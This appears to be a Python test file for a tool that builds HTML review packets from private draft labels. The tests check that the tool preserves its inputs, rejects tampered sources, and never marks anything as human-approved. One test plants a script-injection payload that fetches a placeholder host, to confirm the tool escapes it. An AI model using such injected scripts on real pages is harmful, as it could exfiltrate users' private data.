"""Review packets isolate private drafts and never manufacture human approval."""

import importlib.util
import json
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from PIL import Image

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import review_packet

spec = importlib.util.spec_from_file_location(
    "packet_fixtures", Path(__file__).with_name("test-reference-data.py")
)
fixture = importlib.util.module_from_spec(spec)
spec.loader.exec_module(fixture)


class PacketTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name) / "private"
        (self.root / "raw").mkdir(parents=True)
        (self.root / "labels/provisional").mkdir(parents=True)
        self.output = Path(self.temp.name) / "packet"
        self.image = self.root / "raw/invented.png"
        Image.new("RGB", (100, 100), "white").save(self.image)
        self.identity = review_packet.sha(self.image)
        self.ref = fixture.reference(0)
        self.ref.update(
            verified=False, reviewed_at=None, approval_hash=None, coverage_confirmed=False
        )
        self.ref["document_hashes"] = [self.identity]
        self.ref["sources"][0].update(
            source_hash=self.identity, original_hash=self.identity, relationships_confirmed=False
        )
        for row in self.ref["appointments"]:
            for field in row["fields"].values():
                field.update(confirmed_at=None, confirmed_value=None)
        for line in self.ref["lines"]:
            line["source_hash"] = self.identity
        self.path = self.root / "labels/provisional" / (self.identity + ".json")
        self.path.write_text(json.dumps(self.ref))
        (self.root / "inventory.json").write_text(
            json.dumps({"entries": [{"sha256": self.identity, "filename": "invented.png"}]})
        )

    def test_complete_packet_preserves_all_inputs_and_has_no_approvals(self):
        before = {p: review_packet.sha(p) for p in self.root.rglob("*") if p.is_file()}
        result = review_packet.build(self.root, self.output)
        self.assertEqual(result["counts"]["originals"], 1)
        self.assertEqual(result["counts"]["rows"], len(self.ref["appointments"]))
        self.assertEqual(result["counts"]["text_polygons"], len(self.ref["lines"]))
        for key in [
            "approved_references",
            "approved_crops",
            "approved_privacy_reviews",
            "confirmed_relationships",
            "confirmed_fields",
        ]:
            self.assertEqual(result["counts"][key], 0)
        self.assertFalse(result["grants_approval"])
        draft = json.loads((self.output / "privacy-draft.json").read_text())["sources"][
            self.identity
        ]
        self.assertFalse(draft["table_privacy_reviewed"])
        self.assertIsNone(draft["approval_hash"])
        self.assertEqual(
            before, {p: review_packet.sha(p) for p in self.root.rglob("*") if p.is_file()}
        )
        self.assertEqual(review_packet.sha(self.output / "sources/000.png"), self.identity)
        self.assertEqual(
            review_packet.sha(self.output / "snapshots/000.reference.json"),
            review_packet.sha(self.path),
        )
        page = (self.output / "pages/000.html").read_text()
        for section in ["days", "fields", "crops", "privacy"]:
            self.assertIn('id="' + section + '"', page)
        self.assertIn("connect-src 'none'", page)
        self.assertEqual(page.count('class="crop"'), len(self.ref["lines"]))
        for name, value in result["files"].items():
            self.assertEqual(review_packet.sha(self.output / name), value)
        with self.assertRaises(ValueError):
            review_packet.build(self.root, self.output)

    def test_private_text_is_escaped_and_absent_from_manifest(self):
        injected = '</textarea><script>fetch("https://example.invalid/private")</script>'
        self.ref["appointments"][0]["title"] = injected
        self.ref["lines"][0]["text"] = injected
        self.path.write_text(json.dumps(self.ref))
        result = review_packet.build(self.root, self.output)
        page = (self.output / "pages/000.html").read_text()
        self.assertNotIn(injected, page)
        self.assertIn("&lt;/textarea&gt;&lt;script&gt;", page)
        self.assertNotIn("example.invalid", json.dumps(result))

    def test_changed_original_symlinks_and_in_source_output_are_rejected(self):
        with self.assertRaises(ValueError):
            review_packet.build(self.root, self.root / "packet")
        real = self.image.with_suffix(".saved")
        self.image.rename(real)
        self.image.symlink_to(real)
        with self.assertRaises(ValueError):
            review_packet.build(self.root, self.output)
        self.image.unlink()
        real.rename(self.image)
        self.image.write_bytes(b"changed")
        with self.assertRaises(ValueError):
            review_packet.build(self.root, self.output)
        self.assertFalse(self.output.exists())

    def test_empty_privacy_masks_never_become_reviewed(self):
        draft = review_packet.reference_module().privacy.draft(
            [self.ref], fixture.refs.reference_hash
        )
        (self.root / "privacy-review.json").write_text(json.dumps(draft))
        result = review_packet.build(self.root, self.output)
        self.assertEqual(result["counts"]["approved_privacy_reviews"], 0)
        saved = json.loads((self.output / "privacy-draft.json").read_text())
        self.assertIsNone(saved["sources"][self.identity]["approval_hash"])

    def test_reference_change_during_copy_leaves_no_complete_manifest(self):
        original_copy = review_packet.shutil.copyfile

        def changing_copy(source, target):
            result = original_copy(source, target)
            if Path(target).name == "000.reference.json":
                self.path.write_text(self.path.read_text() + "\n")
            return result

        with patch.object(review_packet.shutil, "copyfile", side_effect=changing_copy):
            with self.assertRaisesRegex(ValueError, "Source changed while building"):
                review_packet.build(self.root, self.output)
        self.assertFalse((self.output / "manifest.json").exists())


if __name__ == "__main__":
    unittest.main()
